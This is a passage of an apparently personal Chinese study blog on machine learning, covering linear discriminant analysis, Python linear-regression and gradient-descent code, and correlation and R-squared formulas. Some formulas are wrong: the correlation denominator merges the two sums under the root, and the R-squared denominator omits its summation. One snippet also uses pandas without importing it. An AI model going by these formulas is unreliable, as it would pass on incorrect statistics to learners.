style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathdefault" style="margin-right:0.09618em;">J</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><h2 id="线性判别分析"><a class="markdownIt-Anchor" href="#线性判别分析"></a> 线性判别分析</h2><ul><li>线性判别分析Linear Discriminant Analysis是一种经典的线性学习方法，应用于分类任务中。</li><li>LDA的思想非常简单，将训练集的样本投影到一条直线上，同一类的尽量互相靠近，而不同类之间尽可能相隔的远。使用数学语言，投影即是向量乘积， 同一类尽量靠近，就是协方差要小，不同类相隔远，就是类中心距离远，也就是均值投影的差要大。</li></ul><p><img src="/images/pasted-37.png" alt="中心距离" /></p><ol><li>从贝叶斯决策理论的角度可以证明LDA在两类数据同先验、满足高斯分布且协方差相等时，LDA可达到最优分类。</li><li>LDA核心是投影，这样往往实现了降维，因而LDA也常被视为一种经典的监督降维技术。</li></ol><p><img src="/images/pasted-38.png" alt="样本数据" /></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> linear_model</span><br><span class="line">train_data=pd.read_csv(<span class="string">&#x27;./data/linear3.csv&#x27;</span>,index_col=<span class="number">0</span>)</span><br><span class="line">x=train_data.iloc[:,<span class="number">0</span>:<span class="number">5</span>]</span><br><span class="line">y=train_data.iloc[:,<span class="number">5</span>]</span><br><span class="line">clf = linear_model.LinearRegression()</span><br><span class="line">clf.fit(x,y)</span><br><span class="line">print(clf.coef_) <span class="comment"># 斜率</span></span><br><span class="line">print(clf.intercept_) <span class="comment"># 截距</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 最小二乘法</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LinearRegression</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.w=<span class="literal">None</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fit</span>(<span class="params">self,x,y</span>):</span></span><br><span class="line">        x=np.insert(x,<span class="number">0</span>,<span class="number">1</span>,axis=<span class="number">1</span>)</span><br><span class="line">        x_=np.linalg.inv(x.T.dot(x))</span><br><span class="line">        self.w=x_.dot(x.T).dot(y)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">predict</span>(<span class="params">self,x</span>):</span></span><br><span class="line">        x=np.insert(x,<span class="number">0</span>,<span class="number">1</span>,axis=<span class="number">1</span>) <span class="comment"># 插入了b</span></span><br><span class="line">        y_pred=x.dot(self.w)</span><br><span class="line">        <span class="keyword">return</span> y_pred</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mean_squared_error</span>(<span class="params">y_true,y_pred</span>):</span></span><br><span class="line">    mse=np.mean(np.power(y_true-y_pred,<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> mse</span><br><span class="line">diabetes=datasets.load_diabetes()</span><br><span class="line">x=diabetes.data[:,np.newaxis,<span class="number">2</span>]</span><br><span class="line">print(x.shape)</span><br><span class="line">x_train,x_test=x[:<span class="number">-20</span>],x[<span class="number">-20</span>:]</span><br><span class="line">y_train,y_test=diabetes.target[:<span class="number">-20</span>],diabetes.target[<span class="number">-20</span>:]</span><br><span class="line">clf=LinearRegression()</span><br><span class="line">clf.fit(x_train,y_train)</span><br><span class="line">y_pred=clf.predict(x_test)</span><br><span class="line">print(<span class="string">&#x27;MSE&#x27;</span>,mean_squared_error(y_test,y_pred))</span><br><span class="line">plt.scatter(x_test[:,<span class="number">0</span>],y_test,color=<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line">plt.plot(x_test[:,<span class="number">0</span>],y_pred,color=<span class="string">&#x27;blue&#x27;</span>,linewidth=<span class="number">3</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gradientDescent</span>(<span class="params">x,y,theta,alpha,m,numIterations</span>):</span></span><br><span class="line">    xTrans=x.transpose()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,numIterations):</span><br><span class="line">        hypothesis=np.dot(x,theta)</span><br><span class="line">        loss=hypothesis-y</span><br><span class="line">        cost=np.sum(loss**<span class="number">2</span>)/(<span class="number">2</span>*m)</span><br><span class="line">        gradient=np.dot(xTrans,loss)/m</span><br><span class="line">        theta=theta-alpha*gradient</span><br><span class="line">    <span class="keyword">return</span> theta</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genData</span>(<span class="params">numPoints,bias,variance</span>):</span></span><br><span class="line">    x=np.zeros(shape=(numPoints,<span class="number">2</span>))</span><br><span class="line">    y=np.zeros(shape=numPoints)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,numPoints):</span><br><span class="line">        x[i][<span class="number">0</span>]=<span class="number">1</span></span><br><span class="line">        x[i][<span class="number">1</span>]=i</span><br><span class="line">        y[i]=(i+bias)+random.uniform(<span class="number">0</span>,<span class="number">1</span>)*variance</span><br><span class="line">    <span class="keyword">return</span> x,y</span><br><span class="line">x,y=genData(<span class="number">100</span>,<span class="number">25</span>,<span class="number">10</span>)</span><br><span class="line"><span class="comment"># print(x,y)</span></span><br><span class="line">m,n=np.shape(x)  <span class="comment"># m代表多少个实例</span></span><br><span class="line">numIterations=<span class="number">100000</span>  <span class="comment"># 循环次数</span></span><br><span class="line">alpha=<span class="number">0.0005</span>  <span class="comment">#学习率</span></span><br><span class="line">theta=np.ones(n)  <span class="comment"># 要求得的参数值</span></span><br><span class="line">theta=gradientDescent(x,y,theta,alpha,m,numIterations)</span><br><span class="line">print(theta)</span><br></pre></td></tr></table></figure><h3 id="回归中的相关度和r平方值"><a class="markdownIt-Anchor" href="#回归中的相关度和r平方值"></a> 回归中的相关度和R平方值</h3><ul><li>相关度</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ρ</mi><mo>=</mo><mi>C</mi><mi>o</mi><mi>r</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mi>C</mi><mi>o</mi><mi>v</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow><msqrt><mrow><mi>V</mi><mi>a</mi><mi>r</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mi>V</mi><mi>a</mi><mi>r</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow></msqrt></mfrac></mrow><annotation encoding="application/x-tex">\rho = Cor(X,Y)=\frac{Cov(X,Y)}{\sqrt{Var(X)Var(Y)}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">ρ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.557em;vertical-align:-1.13em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.175em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.935em;"><span class="svg-align" style="top:-3.2em;"><span class="pstrut" style="height:3.2em;"></span><span class="mord" style="padding-left:1em;"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span><span style="top:-2.8950000000000005em;"><span class="pstrut" style="height:3.2em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.28em;"><svg width='400em' height='1.28em' viewBox='0 0 400000 1296' preserveAspectRatio='xMinYMin slice'><path d='M263,681c0.7,0,18,39.7,52,119c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120c340,-704.7,510.7,-1060.3,512,-1067c4.7,-7.3,11,-11,19,-11H40000v40H1012.3s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z M1001 80H40000v40H1012z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.30499999999999994em;"><span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.13em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><ul><li>相关系数：-1负相关，0不相关，1正相关。</li><li>R平方值</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>r</mi><mrow><mi>x</mi><mi>y</mi></mrow></msub><mo>=</mo><mfrac><mrow><mo>∑</mo><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mover accent="true"><mi>x</mi><mo>ˉ</mo></mover><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>y</mi><mo>−</mo><mover accent="true"><mi>y</mi><mo>ˉ</mo></mover><mo stretchy="false">)</mo></mrow><msqrt><mrow><mo>∑</mo><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mover accent="true"><mi>x</mi><mo>ˉ</mo></mover><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo stretchy="false">(</mo><mi>y</mi><mo>−</mo><mover accent="true"><mi>y</mi><mo>ˉ</mo></mover><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></msqrt></mfrac></mrow><annotation encoding="application/x-tex">r_{xy}=\frac{\sum(x-\bar{x})(y-\bar{y})}{\sqrt{\sum(x-\bar{x})^2(y-\bar{y})^2} }</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.557em;vertical-align:-1.13em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.175005em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.934995em;"><span class="svg-align" style="top:-3.2em;"><span class="pstrut" style="height:3.2em;"></span><span class="mord" style="padding-left:1em;"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.56778em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.22222em;">ˉ</span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.56778em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">ˉ</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-2.894995em;"><span class="pstrut" style="height:3.2em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.28em;"><svg width='400em' height='1.28em' viewBox='0 0 400000 1296' preserveAspectRatio='xMinYMin slice'><path d='M263,681c0.7,0,18,39.7,52,119c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120c340,-704.7,510.7,-1060.3,512,-1067c4.7,-7.3,11,-11,19,-11H40000v40H1012.3s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z M1001 80H40000v40H1012z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.30500499999999997em;"><span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.56778em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.22222em;">ˉ</span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.56778em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">ˉ</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.13em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><ul><li>决定系数，反应因变量的全部变异能通过回归关系被自变量解释的比例。<ul><li>简单线性回归：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>R</mi><mn>2</mn></msup><mo>=</mo><msup><mi>r</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">R^2=r^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>相关度</li><li>多远线性回归：</li></ul></li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>r</mi><mn>2</mn></msup><mo>=</mo><mfrac><mrow><mi>S</mi><mi>S</mi><mi>R</mi></mrow><mrow><mi>S</mi><mi>S</mi><mi>t</mi></mrow></mfrac><mo>=</mo><mfrac><mrow><mo>∑</mo><mrow><mo stretchy="false">(</mo><msub><mover accent="true"><mi>y</mi><mo stretchy="true">^</mo></mover><mi>i</mi></msub><mo>−</mo><mover accent="true"><mi>y</mi><mo>ˉ</mo></mover><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></mrow><mrow><mo stretchy="false">(</mo><msub><mi>y</mi><mi>i</mi></msub><mo>−</mo><mover accent="true"><mi>y</mi><mo>ˉ</mo></mover><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></mfrac></mrow><annotation encoding="application/x-tex">r^2=\frac{SSR}{SSt}=\frac{\sum{(\widehat y_i-\bar y)^2}}{(y_i- \bar{y})^2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.04633em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.36033em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">t</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.427108em;vertical-align:-0.936em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4911079999999999em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.56778em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">ˉ</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.67056em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span><span class="svg-align" style="width:calc(100% - 0.11112em);margin-left:0.11112em;top:-3.43056em;"><span class="pstrut" style="height:3em;"></span><span style="height:0.24em;"><svg width='100%' height='0.24em' viewBox='0 0 1062 239' preserveAspectRatio='none'><path d='M529 0h5l519 115c5 1 9 5 9 10 0 1-1 2-1 3l-4 22c-1 5-5 9-11 9h-2L532 67 19 159h-2c-5 0-9-4-11-9l-5-22c-1-6 2-12 8-13z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.56778em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">ˉ</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><msub><mi>S</mi><mi>T</mi></msub><mo>=</mo><munder><mo>∑</mo><mi>i</mi></munder><mo stretchy="false">(</mo><msub><mi>y</mi><mi>i</mi></msub><mo>−</mo><mover accent="true"><mi>y</mi><mo>ˉ</mo></mover><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo separator="true">,</mo><mi>S</mi><msub><mi>S</mi><mi>R</mi></msub><mo>=</mo><munder><mo>∑</mo><mi>i</mi></munder><mo stretchy="false">(</mo><msub><mover accent="true"><mi>y</mi><mo>^</mo></mover><mi>i</mi></msub><mo>−</mo><mover accent="true"><mi>y</mi><mo>ˉ</mo></mover><msup><mo 